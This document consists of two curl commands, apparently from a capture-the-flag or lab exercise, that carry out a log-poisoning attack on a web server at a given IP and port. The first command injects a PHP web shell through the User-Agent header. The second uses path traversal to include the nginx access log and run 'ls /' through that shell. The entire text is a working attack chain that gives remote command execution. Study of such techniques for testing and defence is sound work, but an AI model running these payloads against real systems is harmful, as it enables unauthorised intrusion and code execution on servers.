curl -A '<?php system($_GET[chr(99)]) ?>' "http://46.101.21.240:31074/"

curl -A '' "http://46.101.21.240:31074/?page=../../../var/log/nginx/access.log&c=ls /" --path-as-is
